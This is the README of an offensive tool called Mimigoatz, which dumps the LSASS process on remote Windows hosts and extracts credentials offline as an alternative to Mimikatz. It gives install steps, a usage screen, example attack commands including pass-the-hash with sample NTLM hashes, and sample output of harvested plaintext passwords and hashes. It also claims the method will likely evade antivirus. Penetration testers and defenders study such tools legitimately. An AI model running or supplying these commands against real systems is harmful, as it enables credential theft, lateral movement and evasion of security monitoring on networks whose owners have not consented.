# Mimigoatz
**Overview**

Mimigoatz is an alternative to running Mimikatz on a target system. With advances in Endpoint security and IDS, Mimikatz no longer as effective as it once was.

Mimigoatz leverages crackmapexec, impacket, and pypykatz to dump the lsass.exe process, extract it from the target, and then parse the contents offline to reveal credentials found in memory.

This requires privileged admin credentials for the target(s) to dump the lsass.exe process out of memory and will fail without sufficient access.

This may still be picked up by AV, but chances are it won't be caught.

--------------------------------------------------------------------------------


**Installation**

`pip install -r requirements.txt`

`pip3 install pypykatz`

--------------------------------------------------------------------------------




```
            _))               __  __ _           _                   _       
           > *\     _~       |  \/  (_)_ __ ___ (_) __ _  ___   __ _| |_ ____
           `;'\\__-' \_      | |\/| | | '_ ` _ \| |/ _` |/ _ \ / _` | __|_  /
              | )  _ \ \     | |  | | | | | | | | | (_| | (_) | (_| | |_ / / 
  ejm97      / / ``   w w    |_|  |_|_|_| |_| |_|_|\__, |\___/ \__,_|\__/___|
            w w                                    |___/                     

                              Version 1.0.3b | Written by Adam Logue & Ryan Griffin.

Special Thanks: Richard Young, Frank Scarpella, Zach Warren, and Piero Picasso.


usage: mimigoatz.py [-h] [-d DOMAIN] [-p PASSWORD] [-t TARGET] [-u USERNAME]
                    [-f FILE] [-H HASH] [--local]

Alternative Mimikatz LSASS DUMPER

optional arguments:
  -h, --help   show this help message and exit
  -d DOMAIN    Domain.
  -p PASSWORD  Password.
  -t TARGET    Single Target
  -u USERNAME  Username.
  -f FILE      File Containing One Host Per Line.
  -H HASH      Pass the Hash
  --local      Use Local Authentication
  ```
  
  --------------------------------------------------------------------------------
  
  **Example Usage**
  
  *Single target standard user password combination example*
  
  `python mimigoatz.py -t 10.0.0.1 -d AMERICAS -u john_smith -p Summer2019!`
  
  *Target File containing one host per line example*
  
  `python mimigoatz.py -f hosts.txt -d AMERICAS -u john_smith -p Summer2019!`
  
   *Local Admin username pass-the-hash*
   
  `python mimigoatz.py -t 10.0.0.1 -u Administrator -H c79357f8dd55539a9511ccbadf9201f8 --local`
  
  *Admin User on domain pass-the-hash*
  
  `python mimigoatz.py -t 10.0.0.1 -d AMERICAS -u john_smith -H aad3b435b51404eeaad3b435b51404ee:c79357f8dd55539a9511ccbadf9201f8` 

--------------------------------------------------------------------------------
  **Output**
  
By default, mimigoatz will output json files for each target in the format pypykatz_targetIP.json.
```
[+] wdigest:
	AMERICAS\John_Smith:Summer2019!
	AMERICAS\John_Smith:aad3b435b51404eeaad3b435b51404ee:c79357f8dd55539a9511ccbadf9201f8
[+] credssp:
	AMERICAS\John_Smith:Summer2019!
[+] msv:
	AMERICAS\John_Smith:aad3b435b51404eeaad3b435b51404ee:c79357f8dd55539a9511ccbadf9201f8
```

##TO DO##

Fix Hardcoded Impacket location
